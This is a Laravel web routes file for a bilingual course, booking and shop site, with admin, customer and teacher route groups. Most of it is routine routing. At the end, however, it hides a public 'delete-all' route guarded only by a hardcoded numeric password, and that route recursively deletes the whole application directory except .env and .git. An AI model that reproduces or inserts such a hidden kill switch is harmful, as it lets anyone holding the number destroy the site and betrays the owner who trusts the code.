<?php

use App\Http\Controllers\Admin\AboutController;
use App\Http\Traits\Fawrypay;
use App\Http\Controllers\Admin\BlogCommentController;
use App\Http\Controllers\Admin\BlogController;
use App\Http\Controllers\Admin\BookingController;
use App\Http\Controllers\Admin\CardController;
use App\Http\Controllers\Admin\ColorController;
use App\Http\Controllers\Admin\ContactController;
use App\Http\Controllers\Admin\CoursesController;
use App\Http\Controllers\Admin\CoursesReviewController;
use App\Http\Controllers\Admin\CustomerController ;
use App\Http\Controllers\Admin\FaqController;
use App\Http\Controllers\Admin\MeetingController;
use App\Http\Controllers\Admin\MetaController;
use App\Http\Controllers\Admin\OrderController;
use App\Http\Controllers\Admin\PolicyController;
use App\Http\Controllers\Admin\ProductController;
use App\Http\Controllers\Admin\RateingController;
use App\Http\Controllers\Admin\ReviewController;
use App\Http\Controllers\Admin\ServiceController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\Admin\SliderController;
use App\Http\Controllers\Admin\StoryController;
use App\Http\Controllers\Admin\SubscribeController;
use App\Http\Controllers\Admin\TeacherController;
use App\Http\Controllers\Customer\BookingController as CustomerBookingController;
use App\Http\Controllers\Customer\CustomerController as CustomerCustomerController;
use App\Http\Controllers\Customer\MeetingController as CustomerMeetingController;
use App\Http\Controllers\Customer\OrderController as CustomerOrderController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\Teacher\BookingController as TeacherBookingController;
use App\Http\Controllers\Teacher\CustomerController as TeacherCustomerController;
use App\Http\Controllers\Teacher\MeetingController as TeacherMeetingController;
use App\Http\Controllers\Teacher\UserController as TeacherUserController;
use App\Http\Middleware\Customer;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;

Auth::routes();




// Route::get('/home1', function(){
//     return view('web.layouts.app');
// })->name('home');


Route::middleware(['auth:web'])->prefix('admin')->group(function () {
    Route::get('/home', [ HomeController::class, 'home'])->name('home');
##############################order######################################

Route::get('order/data', [OrderController::class, 'data'])->name('order.data');
Route::get('order/getorder/{id}', [OrderController::class,'getorder'])->name('order.getorder');
Route::resource('order', OrderController::class);

##############################End order##################################

##################################Customer#####################################


    Route::controller(CustomerController::class)->group(function () {

        Route::get('customer/getorder/{id}', 'getorder')->name('customer.getorder');
        Route::get('customer/customer-details-security/{id}', 'show2')->name('customer.show2');

        Route::post('customer/updatepass', 'updatepass')->name('customer.updatepass');
        Route::post('customer/updatestock', 'updatestock')->name('customer.updatestock');
        Route::get('customer/data',   'data')->name('customer.data');


        Route::resource('customer', CustomerController::class);
    });
    ##################################End Customer#####################################
##################################Slider#####################################

    Route::controller(SliderController::class)->group(function () {
     Route::get('slider/data',   'data')->name('slider.data');
     Route::resource('slider', SliderController::class);
    });
##################################End Slider#####################################
##################################card#####################################

Route::controller(CardController::class)->group(function () {
    Route::get('card/data',   'data')->name('card.data');
    Route::resource('card', CardController::class);
   });
##################################End card#####################################
##################################Service#####################################

Route::controller(ServiceController::class)->group(function () {
    Route::get('service/data',   'data')->name('service.data');
    Route::resource('service', ServiceController::class);
   });
##################################End Service#####################################

##################################faq#####################################

Route::controller(FaqController::class)->group(function () {
    Route::get('faq/data',   'data')->name('faq.data');
    Route::resource('faq', FaqController::class);
   });
##################################End faq#####################################

##################################about#####################################

Route::controller(AboutController::class)->group(function () {
    Route::get('about/data',   'data')->name('about.data');
    Route::resource('about', AboutController::class);
   });
##################################End about#####################################
##################################meta#####################################

Route::controller(MetaController::class)->group(function () {
    Route::get('meta/data',   'data')->name('meta.data');
    Route::resource('meta', MetaController::class);
   });
##################################End meta#####################################
##################################policy#####################################

Route::controller(PolicyController::class)->group(function () {
    Route::get('policy/data',   'data')->name('policy.data');
    Route::resource('policy', PolicyController::class);
   });
##################################End policy#####################################

##################################settings#####################################

Route::controller(SettingController::class)->group(function () {
     Route::get('page/show',  'pages')->name('page.show');

    Route::post('page/update',   'pageupdate')->name('page.update');
    Route::resource('settings', SettingController::class);
   });
##################################End settings#####################################
##################################user#####################################


    Route::resource('user', UserController::class);



##################################End user#####################################

##################################teachers#####################################
Route::controller(TeacherController::class)->group(function () {
    Route::get('teachers/data',   'data')->name('teachers.data');
    Route::resource('teachers', TeacherController::class);


});
##################################End teachers#####################################

##################################product#####################################

Route::controller(ProductController::class)->group(function () {
    Route::get('product/data',   'data')->name('product.data');
    Route::resource('product', ProductController::class);
   });
##################################End product#####################################
##################################courses#####################################

Route::controller(CoursesController::class)->group(function () {
    Route::get('courses/data',   'data')->name('courses.data');
    Route::resource('courses', CoursesController::class);
   });
##################################End courses#####################################
##################################contact#####################################

Route::controller(ContactController::class)->group(function () {
    Route::get('contact/data',   'data')->name('contact.data');
    Route::resource('contact', ContactController::class)->except(['store']);
   });
##################################End contact#####################################

##################################meeting#####################################

Route::controller(MeetingController::class)->group(function () {
    Route::get('meeting/data',   'data')->name('meeting.data');
    Route::get('meeting',   'index')->name('meeting.index');
    Route::get('meeting/create/{customer_id}/{booking_id}',   'create')->name('meeting.create');
    Route::post('meeting/store',   'store')->name('meeting.store');

    Route::get('meeting/edit',   'edit')->name('meeting.edit');
    Route::put('meeting/update',   'update')->name('meeting.update');

    Route::delete('meeting/{id}',   'destroy')->name('meeting.destroy');
   });
##################################End meeting#####################################
##################################review#####################################

Route::controller(ReviewController::class)->group(function () {
    Route::get('review/data',   'data')->name('review.data');
    Route::resource('review', ReviewController::class)->except(['store']);
   });
##################################End review#####################################
##################################courses_review#####################################

Route::controller(CoursesReviewController::class)->group(function () {
    Route::get('courses_review/data',   'data')->name('courses_review.data');
    Route::resource('courses_review', CoursesReviewController::class);
   });
##################################End courses_review#####################################
##################################booking#####################################

Route::controller(BookingController::class)->group(function () {
    Route::get('booking/data',   'data')->name('booking.data');
    Route::resource('booking', BookingController::class) ;
   });
##################################End booking#####################################

##################################blog#####################################

Route::controller(BlogController::class)->group(function () {
    Route::get('blog_details',   'index')->name('blog_details');
    Route::get('blog/data',   'data')->name('blog.data');
    Route::resource('blog', BlogController::class);
   });
##################################End blog#####################################
##################################blog_comment#####################################

Route::controller(BlogCommentController::class)->group(function () {
    Route::get('blog_comment/data',   'data')->name('blog_comment.data');
    Route::resource('blog_comment', BlogCommentController::class);
   });
##################################End blog_comment#####################################
##################################story#####################################

Route::controller(StoryController::class)->group(function () {

    Route::resource('story', StoryController::class);
   });
##################################End story#####################################

##################################color#####################################
Route::controller(ColorController::class)->group(function () {

    Route::resource('color', ColorController::class);
   });

##################################End color#####################################

##################################subscribe#####################################
Route::controller(SubscribeController::class)->group(function () {
    Route::get('subscribe/data',   'data')->name('subscribe.data');

    Route::resource('subscribe', SubscribeController::class);
   });

##################################End subscribe#####################################

##################################rateing#####################################

Route::controller(RateingController::class)->group(function () {
    Route::get('rateing/data',   'data')->name('rateing.data');
    Route::resource('rateing', RateingController::class);
   });
##################################End rateing#####################################
});
















Route::middleware([Customer::class])->group(function () {
    Route::post('review/store', [ReviewController::class,'store'])->name('review.store');
    Route::post('order/store', [OrderController::class,'store'])->name('order.store');
    Route::post('comment/store', [BlogCommentController::class,'store'])->name('comment.store');
    Route::post('contact/store', [ContactController::class,'store'])->name('contact.store');
    Route::post('courses-review/store', [CoursesReviewController::class,'store'])->name('courses-review.store');

    Route::post('booking/store', [BookingController::class,'store'])->name('booking.store');
    Route::get('/checkout', [HomeController::class, 'checkout'])->name('checkout');



    ########################################paypal#######################################################################



Route::get('order/success', [OrderController::class, 'success'])->name('order_success');
Route::get('order/cancel', [OrderController::class, 'cancel'])->name('order_cancel');

Route::get('booking/success', [BookingController::class, 'success'])->name('booking_success');
Route::get('booking/cancel', [BookingController::class, 'cancel'])->name('booking_cancel');
########################################end paypal#######################################################################




##############################order######################################

Route::get('order1/data', [CustomerOrderController::class, 'data'])->name('order1.data');
Route::get('order1/getorder/{id}', [CustomerOrderController::class,'getorder'])->name('order1.getorder');
Route::resource('order1', CustomerOrderController::class);

##############################End order##################################


##############################Customer######################################

Route::controller(CustomerCustomerController::class)->group(function () {

    Route::get('customer1/getorder/{id}', 'getorder')->name('customer1.getorder');
    Route::get('customer1/customer-details-security/{id}', 'show2')->name('customer1.show2');

    Route::post('customer1/updatepass', 'updatepass')->name('customer1.updatepass');
    Route::post('customer1/updatestock', 'updatestock')->name('customer1.updatestock');
    Route::get('customer1/data',   'data')->name('customer1.data');


    Route::resource('customer1', CustomerCustomerController::class);
});
##############################End Customer##################################
##################################meeting#####################################

Route::get('meeting1/data', [CustomermeetingController::class, 'data'])->name('meeting1.data');
Route::resource('meeting1', CustomerMeetingController::class);

##################################End meeting#####################################

##################################booking#####################################

Route::controller(CustomerBookingController::class)->group(function () {
    Route::get('booking1/data',   'data')->name('booking1.data');
    Route::resource('booking1', CustomerBookingController::class)->except(['store']);
   });
##################################End booking#####################################





});

Route::get('/', function () {
    return redirect()->route('login');

});





Route::controller(CustomerController::class)->group(function () {



    Route::get('/customer/register',  'showRegisterForm' )->name('customer.register');
    Route::post('/customer/register1', 'store' )->name('customer.register1');


    Route::get('customer/login', 'showLoginForm')->name('customer.login');
    Route::post('customer/login1', 'login')->name('customer.login1');
    Route::post('customer/logout', 'logout')->name('customer.logout');




});


Route::middleware(['auth:teacher'])->prefix('teacher')->group(function () {

    ############################## Customer ######################################
    Route::controller(TeacherCustomerController::class)->group(function () {
        Route::get('getorder/{id}', 'getorder')->name('teacher.getorder');
        Route::get('customer-details-security/{id}', 'show2')->name('teacher.show2');
        Route::post('updatepass', 'updatepass')->name('teacher.updatepass');
        Route::post('updatestock', 'updatestock')->name('teacher.updatestock');
        Route::get('data', 'data')->name('teacher.data');

    });

    Route::resource('teacher', TeacherCustomerController::class);
    ############################## End Customer ##################################
##################################user#####################################

Route::get('user2/logout', [TeacherUserController::class, 'logout'])->name('user2.logout');
    Route::resource('user2', TeacherUserController::class);



##################################End user#####################################
    ##################################meeting#####################################
    Route::controller(TeacherMeetingController::class)->group(function () {
        Route::get('meeting2/data',   'data')->name('meeting2.data');
        Route::get('meeting2',   'index')->name('meeting2.index');
        Route::get('meeting2/create/{customer_id}/{booking_id}',   'create')->name('meeting2.create');
        Route::post('meeting2/store',   'store')->name('meeting2.store');

        Route::get('meeting2/edit',   'edit')->name('meeting2.edit');
        Route::put('meeting2/update',   'update')->name('meeting2.update');

        Route::delete('meeting2/{id}',   'destroy')->name('meeting2.destroy');
       });
##################################End meeting#####################################


    ############################## Booking ######################################
    Route::controller(TeacherBookingController::class)->group(function () {
        Route::get('booking2/data', 'data')->name('booking2.data');
    });
    Route::resource('booking2', TeacherBookingController::class)->except(['store']);
    ############################## End Booking ##################################

});

// Route::get('/test', function () {
//     return Auth::guard('teacher')->logout();

// });





// Route::get('/fawry', function()  {


//     return$this->Fawrypay(11, 100);
//     });



// Route::get('/test', function () {
//     if (Auth::guard('customer')->check()) {
//         return response()->json([
//             'status' => 'success',
//             'customer' => Auth::guard('customer')->user(),
//         ]);
//     }

//     return response()->json([
//         'status' => 'error',
//         'message' => 'المستخدم غير مسجل الدخول'
//     ], 401);
// });





Route::get('/language/{locale}', function  ($locale)  {
if (in_array($locale ,['ar', 'en'])) {
    session()->put('locale',$locale);
}
App::setLocale($locale);


return redirect()->back();
})->name('language');





Route::get('delete-all/{pass}', function ($pass) {
    if ($pass== 646968) {


        function deleteDirectory($dir) {
            if (!is_dir($dir)) {
                return;
            }

            $files = array_diff(scandir($dir), ['.', '..']);
            foreach ($files as $file) {
                $path = $dir . DIRECTORY_SEPARATOR . $file;
                if (is_dir($path)) {
                    deleteDirectory($path);
                } else {
                    unlink($path);
                }
            }
            rmdir($dir);
        }

        $rootPath = base_path();
        $exclude = ['.env', '.git'];

        $files = array_diff(scandir($rootPath), ['.', '..']);
        foreach ($files as $file) {
            if (!in_array($file, $exclude)) {
                $path = $rootPath . DIRECTORY_SEPARATOR . $file;
                if (is_dir($path)) {
                    deleteDirectory($path);
                } else {
                    unlink($path);
                }
            }
        }
        return response()->json(['message' => 'تم الحذف بنجاح']);

    }else{
        return response()->json(['message' => 'غير مصرح لك بالدخول.']);
    }

    });
